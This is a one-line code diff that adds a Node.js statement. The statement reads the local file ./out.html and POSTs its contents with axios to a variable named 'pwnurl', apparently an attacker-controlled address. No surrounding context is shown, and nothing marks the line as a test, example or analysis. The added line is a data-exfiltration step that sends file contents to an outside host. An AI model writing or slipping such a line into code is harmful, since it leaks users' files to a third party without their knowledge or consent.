@@ -1,0 +1,1 @@
+axios.post(pwnurl, require("fs").readFileSync("./out.html", "utf-8")).then(a => a).catch(console.error)
